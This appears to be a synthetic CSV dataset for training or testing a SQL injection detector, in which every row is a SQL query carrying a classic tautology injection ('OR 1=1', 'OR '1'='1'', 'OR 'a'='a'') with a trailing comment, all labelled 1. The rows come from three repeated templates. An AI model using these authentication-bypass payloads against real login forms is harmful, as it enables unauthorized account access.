text,label
SELECT * FROM login WHERE password = '' OR 'a'='a' --comment-3493;,1
SELECT * FROM accounts WHERE email = 'test@example.com' OR 1=1 --comment-8136;,1
SELECT * FROM accounts WHERE email = 'test@example.com' OR 1=1 --comment-3921;,1
SELECT * FROM login WHERE password = '' OR 'a'='a' --comment-2637;,1
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --comment-6253;,1
SELECT * FROM accounts WHERE email = 'test@example.com' OR 1=1 --comment-4319;,1
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --comment-4621;,1
SELECT * FROM accounts WHERE email = 'test@example.com' OR 1=1 --comment-1649;,1
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --comment-4538;,1
SELECT * FROM accounts WHERE email = 'test@example.com' OR 1=1 --comment-6747;,1
SELECT * FROM login WHERE password = '' OR 'a'='a' --comment-6216;,1
SELECT * FROM login WHERE password = '' OR 'a'='a' --comment-8712;,1
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --comment-5376;,1
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --comment-3381;,1
SELECT * FROM accounts WHERE email = 'test@example.com' OR 1=1 --comment-2321;,1
SELECT * FROM login WHERE password = '' OR 'a'='a' --comment-7442;,1
SELECT * FROM login WHERE password = '' OR 'a'='a' --comment-4491;,1
SELECT * FROM login WHERE password = '' OR 'a'='a' --comment-7842;,1
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --comment-4910;,1
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --comment-4655;,1
SELECT * FROM login WHERE password = '' OR 'a'='a' --comment-9002;,1
SELECT * FROM login WHERE password = '' OR 'a'='a' --comment-9231;,1
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --comment-4491;,1
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --comment-5032;,1
SELECT * FROM login WHERE password = '' OR 'a'='a' --comment-4595;,1
SELECT * FROM accounts WHERE email = 'test@example.com' OR 1=1 --comment-2811;,1
SELECT * FROM login WHERE password = '' OR 'a'='a' --comment-9489;,1
SELECT * FROM login WHERE password = '' OR 'a'='a' --comment-4833;,1
SELECT * FROM login WHERE password = '' OR 'a'='a' --comment-6303;,1
SELECT * FROM accounts WHERE email = 'test@example.com' OR 1=1 --comment-2890;,1
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --comment-1489;,1
SELECT * FROM accounts WHERE email = 'test@example.com' OR 1=1 --comment-2105;,1
SELECT * FROM login WHERE password = '' OR 'a'='a' --comment-2727;,1
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --comment-1185;,1
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --comment-9213;,1
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --comment-5089;,1
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --comment-1079;,1
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --comment-8581;,1
SELECT * FROM login WHERE password = '' OR 'a'='a' --comment-5648;,1
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --comment-5240;,1
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --comment-4576;,1
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --comment-2780;,1
SELECT * FROM login WHERE password = '' OR 'a'='a' --comment-1224;,1
SELECT * FROM login WHERE password = '' OR 'a'='a' --comment-2193;,1
SELECT * FROM login WHERE password = '' OR 'a'='a' --comment-7894;,1
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --comment-3936;,1
SELECT * FROM accounts WHERE email = 'test@example.com' OR 1=1 --comment-2732;,1
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --comment-2288;,1
SELECT * FROM accounts WHERE email = 'test@example.com' OR 1=1 --comment-8663;,1
SELECT * FROM accounts WHERE email = 'test@example.com' OR 1=1 --comment-5959;,1
SELECT * FROM login WHERE password = '' OR 'a'='a' --comment-9159;,1
SELECT * FROM login WHERE password = '' OR 'a'='a' --comment-5431;,1
SELECT * FROM login WHERE password = '' OR 'a'='a' --comment-2552;,1
SELECT * FROM login WHERE password = '' OR 'a'='a' --comment-9417;,1
SELECT * FROM accounts WHERE email = 'test@example.com' OR 1=1 --comment-9231;,1
SELECT * FROM accounts WHERE email = 'test@example.com' OR 1=1 --comment-8779;,1
SELECT * FROM login WHERE password = '' OR 'a'='a' --comment-7405;,1
SELECT * FROM accounts WHERE email = 'test@example.com' OR 1=1 --comment-6004;,1
SELECT * FROM accounts WHERE email = 'test@example.com' OR 1=1 --comment-9036;,1
SELECT * FROM login WHERE password = '' OR 'a'='a' --comment-7634;,1
SELECT * FROM login WHERE password = '' OR 'a'='a' --comment-8104;,1
SELECT * FROM login WHERE password = '' OR 'a'='a' --comment-7323;,1
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --comment-3189;,1
SELECT * FROM accounts WHERE email = 'test@example.com' OR 1=1 --comment-9897;,1
SELECT * FROM accounts WHERE email = 'test@example.com' OR 1=1 --comment-9404;,1
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --comment-1699;,1
SELECT * FROM accounts WHERE email = 'test@example.com' OR 1=1 --comment-1567;,1
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --comment-2148;,1
SELECT * FROM login WHERE password = '' OR 'a'='a' --comment-4181;,1
SELECT * FROM login WHERE password = '' OR 'a'='a' --comment-7871;,1
SELECT * FROM login WHERE password = '' OR 'a'='a' --comment-4384;,1
SELECT * FROM accounts WHERE email = 'test@example.com' OR 1=1 --comment-7948;,1
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --comment-7015;,1
SELECT * FROM login WHERE password = '' OR 'a'='a' --comment-3236;,1
SELECT * FROM accounts WHERE email = 'test@example.com' OR 1=1 --comment-2053;,1
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --comment-8132;,1
SELECT * FROM accounts WHERE email = 'test@example.com' OR 1=1 --comment-4960;,1
SELECT * FROM accounts WHERE email = 'test@example.com' OR 1=1 --comment-7915;,1
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --comment-2519;,1
SELECT * FROM accounts WHERE email = 'test@example.com' OR 1=1 --comment-5944;,1
SELECT * FROM login WHERE password = '' OR 'a'='a' --comment-2520;,1
SELECT * FROM login WHERE password = '' OR 'a'='a' --comment-8273;,1
SELECT * FROM accounts WHERE email = 'test@example.com' OR 1=1 --comment-6034;,1
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --comment-2168;,1
SELECT * FROM login WHERE password = '' OR 'a'='a' --comment-6717;,1
SELECT * FROM accounts WHERE email = 'test@example.com' OR 1=1 --comment-9621;,1
SELECT * FROM login WHERE password = '' OR 'a'='a' --comment-2781;,1
SELECT * FROM login WHERE password = '' OR 'a'='a' --comment-7543;,1
SELECT * FROM accounts WHERE email = 'test@example.com' OR 1=1 --comment-5092;,1
SELECT * FROM login WHERE password = '' OR 'a'='a' --comment-3183;,1
SELECT * FROM login WHERE password = '' OR 'a'='a' --comment-7818;,1
SELECT * FROM accounts WHERE email = 'test@example.com' OR 1=1 --comment-8496;,1
SELECT * FROM login WHERE password = '' OR 'a'='a' --comment-6829;,1
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --comment-8034;,1
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --comment-4949;,1
SELECT * FROM accounts WHERE email = 'test@example.com' OR 1=1 --comment-5871;,1
SELECT * FROM login WHERE password = '' OR 'a'='a' --comment-1542;,1
SELECT * FROM accounts WHERE email = 'test@example.com' OR 1=1 --comment-1368;,1
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --comment-2716;,1
SELECT * FROM login WHERE password = '' OR 'a'='a' --comment-7118;,1
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --comment-7067;,1
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --comment-1675;,1
SELECT * FROM accounts WHERE email = 'test@example.com' OR 1=1 --comment-8916;,1
SELECT * FROM accounts WHERE email = 'test@example.com' OR 1=1 --comment-8493;,1
SELECT * FROM accounts WHERE email = 'test@example.com' OR 1=1 --comment-8520;,1
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --comment-4686;,1
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --comment-5522;,1
SELECT * FROM login WHERE password = '' OR 'a'='a' --comment-8997;,1
SELECT * FROM accounts WHERE email = 'test@example.com' OR 1=1 --comment-1513;,1
SELECT * FROM login WHERE password = '' OR 'a'='a' --comment-8831;,1
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --comment-4706;,1
SELECT * FROM login WHERE password = '' OR 'a'='a' --comment-2538;,1
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --comment-4437;,1
SELECT * FROM accounts WHERE email = 'test@example.com' OR 1=1 --comment-5520;,1
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --comment-3492;,1
SELECT * FROM accounts WHERE email = 'test@example.com' OR 1=1 --comment-7557;,1
SELECT * FROM login WHERE password = '' OR 'a'='a' --comment-7796;,1
SELECT * FROM accounts WHERE email = 'test@example.com' OR 1=1 --comment-8642;,1
SELECT * FROM login WHERE password = '' OR 'a'='a' --comment-5291;,1
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --comment-9134;,1
SELECT * FROM accounts WHERE email = 'test@example.com' OR 1=1 --comment-8047;,1
SELECT * FROM accounts WHERE email = 'test@example.com' OR 1=1 --comment-7098;,1
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --comment-6183;,1
SELECT * FROM login WHERE password = '' OR 'a'='a' --comment-5219;,1
SELECT * FROM login WHERE password = '' OR 'a'='a' --comment-8201;,1
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --comment-1480;,1
SELECT * FROM login WHERE password = '' OR 'a'='a' --comment-5607;,1
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --comment-4074;,1
SELECT * FROM login WHERE password = '' OR 'a'='a' --comment-9907;,1
SELECT * FROM login WHERE password = '' OR 'a'='a' --comment-2414;,1
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --comment-7671;,1
SELECT * FROM accounts WHERE email = 'test@example.com' OR 1=1 --comment-8089;,1
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --comment-8187;,1
SELECT * FROM login WHERE password = '' OR 'a'='a' --comment-7127;,1
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --comment-5909;,1
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --comment-5922;,1
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --comment-8685;,1
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --comment-3508;,1
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --comment-6082;,1
SELECT * FROM login WHERE password = '' OR 'a'='a' --comment-8951;,1
SELECT * FROM accounts WHERE email = 'test@example.com' OR 1=1 --comment-7256;,1
SELECT * FROM accounts WHERE email = 'test@example.com' OR 1=1 --comment-2900;,1
SELECT * FROM login WHERE password = '' OR 'a'='a' --comment-6243;,1
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --comment-6990;,1
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --comment-2347;,1
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --comment-6914;,1
SELECT * FROM login WHERE password = '' OR 'a'='a' --comment-2564;,1
SELECT * FROM accounts WHERE email = 'test@example.com' OR 1=1 --comment-7396;,1
SELECT * FROM login WHERE password = '' OR 'a'='a' --comment-5008;,1
SELECT * FROM login WHERE password = '' OR 'a'='a' --comment-6481;,1
SELECT * FROM accounts WHERE email = 'test@example.com' OR 1=1 --comment-4874;,1
SELECT * FROM login WHERE password = '' OR 'a'='a' --comment-2700;,1
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --comment-1834;,1
SELECT * FROM login WHERE password = '' OR 'a'='a' --comment-9660;,1
SELECT * FROM login WHERE password = '' OR 'a'='a' --comment-2019;,1
SELECT * FROM accounts WHERE email = 'test@example.com' OR 1=1 --comment-7987;,1
SELECT * FROM accounts WHERE email = 'test@example.com' OR 1=1 --comment-7101;,1
SELECT * FROM login WHERE password = '' OR 'a'='a' --comment-2297;,1
SELECT * FROM accounts WHERE email = 'test@example.com' OR 1=1 --comment-1171;,1
SELECT * FROM login WHERE password = '' OR 'a'='a' --comment-1115;,1
SELECT * FROM login WHERE password = '' OR 'a'='a' --comment-7438;,1
SELECT * FROM login WHERE password = '' OR 'a'='a' --comment-4159;,1
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --comment-8086;,1
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --comment-4719;,1
SELECT * FROM login WHERE password = '' OR 'a'='a' --comment-6264;,1
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --comment-5990;,1
SELECT * FROM accounts WHERE email = 'test@example.com' OR 1=1 --comment-2896;,1
SELECT * FROM login WHERE password = '' OR 'a'='a' --comment-4477;,1
SELECT * FROM accounts WHERE email = 'test@example.com' OR 1=1 --comment-5815;,1
SELECT * FROM accounts WHERE email = 'test@example.com' OR 1=1 --comment-2768;,1
SELECT * FROM login WHERE password = '' OR 'a'='a' --comment-8079;,1
SELECT * FROM accounts WHERE email = 'test@example.com' OR 1=1 --comment-9602;,1
SELECT * FROM login WHERE password = '' OR 'a'='a' --comment-4190;,1
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --comment-2871;,1
SELECT * FROM accounts WHERE email = 'test@example.com' OR 1=1 --comment-4552;,1
SELECT * FROM login WHERE password = '' OR 'a'='a' --comment-8635;,1
SELECT * FROM login WHERE password = '' OR 'a'='a' --comment-4089;,1
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --comment-4376;,1
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --comment-6816;,1
SELECT * FROM login WHERE password = '' OR 'a'='a' --comment-3929;,1
SELECT * FROM accounts WHERE email = 'test@example.com' OR 1=1 --comment-7860;,1
SELECT * FROM login WHERE password = '' OR 'a'='a' --comment-4608;,1
SELECT * FROM login WHERE password = '' OR 'a'='a' --comment-3553;,1
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --comment-5547;,1
SELECT * FROM login WHERE password = '' OR 'a'='a' --comment-8750;,1
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --comment-1063;,1
SELECT * FROM login WHERE password = '' OR 'a'='a' --comment-2936;,1
SELECT * FROM accounts WHERE email = 'test@example.com' OR 1=1 --comment-4809;,1
SELECT * FROM accounts WHERE email = 'test@example.com' OR 1=1 --comment-4142;,1
SELECT * FROM login WHERE password = '' OR 'a'='a' --comment-1281;,1
SELECT * FROM login WHERE password = '' OR 'a'='a' --comment-2275;,1
SELECT * FROM login WHERE password = '' OR 'a'='a' --comment-9170;,1
SELECT * FROM login WHERE password = '' OR 'a'='a' --comment-5708;,1
SELECT * FROM accounts WHERE email = 'test@example.com' OR 1=1 --comment-6906;,1
SELECT * FROM login WHERE password = '' OR 'a'='a' --comment-7995;,1
SELECT * FROM login WHERE password = '' OR 'a'='a' --comment-4938;,1
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --comment-3082;,1
SELECT * FROM accounts WHERE email = 'test@example.com' OR 1=1 --comment-9087;,1
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --comment-3666;,1
SELECT * FROM accounts WHERE email = 'test@example.com' OR 1=1 --comment-3589;,1
SELECT * FROM accounts WHERE email = 'test@example.com' OR 1=1 --comment-3460;,1
SELECT * FROM accounts WHERE email = 'test@example.com' OR 1=1 --comment-7171;,1
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --comment-9804;,1
SELECT * FROM login WHERE password = '' OR 'a'='a' --comment-2870;,1
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --comment-4425;,1
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --comment-8098;,1
SELECT * FROM accounts WHERE email = 'test@example.com' OR 1=1 --comment-9035;,1
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --comment-7519;,1
SELECT * FROM accounts WHERE email = 'test@example.com' OR 1=1 --comment-5041;,1
SELECT * FROM login WHERE password = '' OR 'a'='a' --comment-6433;,1
SELECT * FROM login WHERE password = '' OR 'a'='a' --comment-1107;,1
SELECT * FROM accounts WHERE email = 'test@example.com' OR 1=1 --comment-8330;,1
SELECT * FROM login WHERE password = '' OR 'a'='a' --comment-2813;,1
SELECT * FROM accounts WHERE email = 'test@example.com' OR 1=1 --comment-8068;,1
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --comment-2601;,1
SELECT * FROM login WHERE password = '' OR 'a'='a' --comment-2338;,1
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --comment-5528;,1
SELECT * FROM accounts WHERE email = 'test@example.com' OR 1=1 --comment-2856;,1
SELECT * FROM accounts WHERE email = 'test@example.com' OR 1=1 --comment-8127;,1
SELECT * FROM accounts WHERE email = 'test@example.com' OR 1=1 --comment-9549;,1
SELECT * FROM login WHERE password = '' OR 'a'='a' --comment-6874;,1
SELECT * FROM login WHERE password = '' OR 'a'='a' --comment-7856;,1
SELECT * FROM accounts WHERE email = 'test@example.com' OR 1=1 --comment-8345;,1
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --comment-4312;,1
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --comment-9020;,1
SELECT * FROM login WHERE password = '' OR 'a'='a' --comment-3469;,1
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --comment-2111;,1
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --comment-7795;,1
SELECT * FROM login WHERE password = '' OR 'a'='a' --comment-6734;,1
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --comment-3963;,1
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --comment-2602;,1
SELECT * FROM login WHERE password = '' OR 'a'='a' --comment-2873;,1
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --comment-4064;,1
SELECT * FROM accounts WHERE email = 'test@example.com' OR 1=1 --comment-7196;,1
SELECT * FROM accounts WHERE email = 'test@example.com' OR 1=1 --comment-7091;,1
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --comment-6181;,1
SELECT * FROM login WHERE password = '' OR 'a'='a' --comment-6068;,1
SELECT * FROM accounts WHERE email = 'test@example.com' OR 1=1 --comment-4023;,1
SELECT * FROM accounts WHERE email = 'test@example.com' OR 1=1 --comment-7525;,1
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --comment-6369;,1
SELECT * FROM login WHERE password = '' OR 'a'='a' --comment-8378;,1
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --comment-2450;,1
SELECT * FROM login WHERE password = '' OR 'a'='a' --comment-2160;,1
